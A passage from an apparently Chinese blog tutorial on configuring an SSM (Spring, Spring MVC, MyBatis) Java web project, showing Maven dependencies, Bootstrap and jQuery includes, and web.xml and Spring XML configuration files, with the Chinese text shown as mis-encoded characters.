class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--æ•°æ®åº“è¿æ¥æ± --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MySQLçš„é©±åŠ¨--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--JSTL--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--servlet-api--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><br>æ³¨æ„ï¼šservlet-apiæœåŠ¡å™¨ä¸­æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯ä¸€èˆ¬éƒ½å†™ä¸Šè¯¥ä¾èµ–ï¼Œå¹¶ä¸”ä½¿ç”¨<code>&lt;scope&gt;provided&lt;/scope&gt;</code>è¿™æ ·åœ¨æœåŠ¡å™¨ä¸­çš„æ—¶å€™ï¼Œè¯¥jaråŒ…å°±ä¼šè¢«è‡ªåŠ¨å‰”é™¤æ‰</p><h2 id="å¼•å…¥bootstarp"><a href="#å¼•å…¥bootstarp" class="headerlink" title="å¼•å…¥bootstarp"></a>å¼•å…¥bootstarp</h2><p>ä¸‹è½½å¥½bootstarpåï¼Œåœ¨webappä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹åä¸ºstatic,å¹¶å°†è§£å‹å¥½çš„bootstarpæ–‡ä»¶æ”¾è¿›å»<br><img src="/img/JavaWeb/9-17å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><p>å¼•å…¥bootstarpæ ·å¼ï¼š<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link <span class="attribute">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css"</span> <span class="attribute">rel</span>=<span class="string">"stylesheet"</span>&gt;</span><br></pre></td></tr></table></figure><br>åŒæ—¶åˆ«å¿˜äº†æ ¹æ®è‡ªå·±çš„ç›®å½•ç»“æ„ä¿®æ”¹åœ°å€</p><p>å¼•å…¥jsæ–‡ä»¶ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>åŒæ ·æ ¹æ®è‡ªå·±çš„ç›®å½•ç»“æ„ä¿®æ”¹åœ°å€</p><p>å¼•å…¥Jqueryæ–‡ä»¶ï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>ç”±äºbootstarpæ˜¯åŸºäºJqueryçš„ï¼Œæ‰€ä»¥å¿…é¡»å¼•å…¥ï¼Œå®˜ç½‘ä¸‹è½½ä¹‹åï¼Œæ ¹æ®ç›®å½•ä¿®æ”¹åœ°å€</p><p><img src="/img/JavaWeb/9-17å­¦ä¹ æ—¥è®°/1.png" alt="avatar"></p><p>åœ¨å¼•å…¥bootstarpåï¼Œå¯ä»¥å¾ˆå¿«é€Ÿå’Œå¾ˆç¾è§‚çš„åšå‡ºä¸€ä¸ªé¡µé¢ï¼Œä¾‹å¦‚æŒ‰é’®<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-info"</span>&gt;</span>æŒ‰é’®<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/img/JavaWeb/9-17å­¦ä¹ æ—¥è®°/2.png" alt="avatar"></p><p>å°±å¯ä»¥åšå‡ºä¸€ä¸ªç¾è§‚å¤§æ°”çš„æŒ‰é’®ï¼Œæ›´å¤šå…·ä½“æ ·å¼å¯ä»¥å‚è€ƒbootstarpçš„å…¨å±€æ ·å¼æ–‡æ¡£<br><a href="https://v3.bootcss.com/css/" target="_blank" rel="noopener">https://v3.bootcss.com/css/</a></p><h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><h3 id="web-xmlæ–‡ä»¶"><a href="#web-xmlæ–‡ä»¶" class="headerlink" title="web.xmlæ–‡ä»¶"></a>web.xmlæ–‡ä»¶</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--1.å¯åŠ¨Springçš„å®¹å™¨  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.spring mvcçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œæ‹¦æˆªæ‰€æœ‰è¯·æ±‚--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  3.å­—ç¬¦ç¼–ç è¿‡æ»¤å™¨  ä¸€å®šè¦æ”¾åœ¨æ‰€æœ‰è¿‡æ»¤å™¨ä¹‹å‰--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceRequestEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceResponseEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 4.ä½¿ç”¨Resté£æ ¼çš„URI  å°†é¡µé¢æ™®é€šçš„POSTè¯·æ±‚è½¬ä¸ºæŒ‡å®šçš„deleteæˆ–putè¯·æ±‚ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Springmvcé…ç½®æ–‡ä»¶"><a href="#Springmvcé…ç½®æ–‡ä»¶" class="headerlink" title="Springmvcé…ç½®æ–‡ä»¶"></a>Springmvcé…ç½®æ–‡ä»¶</h3><p>dispatcherServlet-servlet.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc https://www.springframework.org/schema/mvc/spring-mvc.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    SpringMVCçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«ç½‘ç«™è·³è½¬é€»è¾‘çš„æ§åˆ¶ï¼Œé…ç½®--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ceit"</span> <span class="attr">use-default-filters</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  åªæ‰«ææ§åˆ¶å™¨      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--  é…ç½®è§†å›¾è§£æå™¨ï¼Œæ–¹ä¾¿é¡µé¢è¿”å›      --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ä¸¤ä¸ªæ ‡å‡†é…ç½®   --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å°†springmvcä¸èƒ½å¤„ç†çš„è¯·æ±‚äº¤ç»™tomcat   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- èƒ½æ”¯æŒspringmvcæ›´é«˜çº§çš„ä¸€äº›åŠŸèƒ½ï¼Œå¿«æ·çš„ajax...æ˜ å°„åŠ¨æ€è¯·æ±‚   --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="Springé…ç½®æ–‡ä»¶"><a href="#Springé…ç½®æ–‡ä»¶" class="headerlink" title="Springé…ç½®æ–‡ä»¶"></a>Springé…ç½®æ–‡ä»¶</h3><p>applicationContext.xml<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span></span><br><span class="line"><span class="xml">       xmlns:context="http://www.springframework.org/schema/context"</span></span><br><span class="line"><span class="xml">       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line"><span class="xml">       xmlns:aop="http://www.springframework.org/schema/aop"</span></span><br><span class="line"><span class="xml">       xmlns:tx="http://www.springframework.org/schema/tx"</span></span><br><span class="line"><span class="xml">       xmlns:p="http://www.springframework.org/schema/p"</span></span><br><span class="line"><span class="xml">       xsi:schemaLocation="</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/context</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/context/spring-context.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/tx</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/tx/spring-tx.xsd</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/aop</span></span><br><span class="line"><span class="xml">                    http://www.springframework.org/schema/aop/spring-aop.xsd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.ceit"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">context:exclude-filter</span> <span class="attr">type</span>=<span class="string">"annotation"</span> <span class="attr">expression</span>=<span class="string">"org.springframework.stereotype.Controller"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- Springçš„é…ç½®æ–‡ä»¶ï¼Œä¸»è¦é…ç½®ä¸ä¸šåŠ¡é€»è¾‘æœ‰å…³çš„   --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--æ•°æ®æºï¼Œäº‹åŠ¡æ§åˆ¶ ...--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:dbconfig.properties"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pooleDataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.jdbcUrl&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.driverClass&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span>  <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;jdbc.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- é…ç½®MyBatisçš„æ•´åˆ   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"SqlSessionFactory"</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- æŒ‡å®šmybatiså…¨å±€é…ç½®æ–‡ä»¶çš„ä½ç½® --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span> <span class="attr">value</span>=<span class="string">"classpath:mybatis-config.xml"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"pooleDataSource"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!--  æŒ‡å®šmybatis.mapperæ–‡ä»¶ä½ç½®      --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapperLocations"</span> <span class="attr">value</span>=<span class="string">"classpath:mapper/*.xml"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- é…ç½®æ‰«æå™¨ï¼Œå°†mybatisæ¥å£çš„å®ç°åŠ å…¥åˆ°iocå®¹å™¨ä¸­   --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span> &gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!--   æ‰«ææ‰€æœ‰daoæ¥å£çš„å®ç°ï¼ŒåŠ å…¥åˆ°iocå®¹å™¨ä¸­     --&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"basePackage"</span> <span class="attr">value</span>=<span class="string">"com.ceit.crud.dao"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--  äº‹åŠ¡æ§åˆ¶  --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"transactionManager"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.datasource.DataSourceTransactionManager"</span> &gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- æ§åˆ¶ä½æ•°æ®æº   